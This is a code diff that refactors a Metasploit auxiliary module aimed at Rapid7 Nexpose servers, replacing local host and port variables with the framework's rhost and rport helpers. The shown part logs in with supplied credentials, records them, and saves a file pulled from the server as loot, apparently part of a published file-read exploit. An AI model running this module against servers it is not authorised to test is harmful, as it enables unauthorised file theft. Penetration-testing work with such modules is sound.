@@ -34,7 +34,6 @@ class Metasploit4 < Msf::Auxiliary
 					[ 'URL', 'https://community.rapid7.com/community/nexpose/blog/2013/08/16/r7-vuln-2013-07-24' ],
 					# Fill this in with the direct advisory URL from Infigo
 					[ 'URL', 'http://www.infigo.hr/in_focus/advisories/' ]
-
 				]
 		))
 
@@ -47,19 +46,17 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def run
-		host = datastore['RHOST']
-		port = datastore['RPORT']
 		user = datastore['USERNAME']
 		pass = datastore['PASSWORD']
 
-		nsc = Nexpose::Connection.new(host, user, pass, port)
+		nsc = Nexpose::Connection.new(rhost, user, pass, rport)
 
 		print_status("Authenticating as: " << user)
 		begin
 			nsc.login
 			report_auth_info(
-				:host   => host,
-				:port   => port,
+				:host   => rhost,
+				:port   => rport,
 				:sname  => 'https',
 				:user   => user,
 				:pass   => pass,
@@ -128,7 +125,7 @@ class Metasploit4 < Msf::Auxiliary
 			return
 		end
 
-		path = store_loot('nexpose.file','text/plain', host, doc.root.elements["//host"].first.to_s, "File from Nexpose server #{host}")
+		path = store_loot('nexpose.file','text/plain', rhost, doc.root.elements["//host"].first.to_s, "File from Nexpose server #{rhost}")
 		print_good("File saved to path: " << path)
 	end
 end
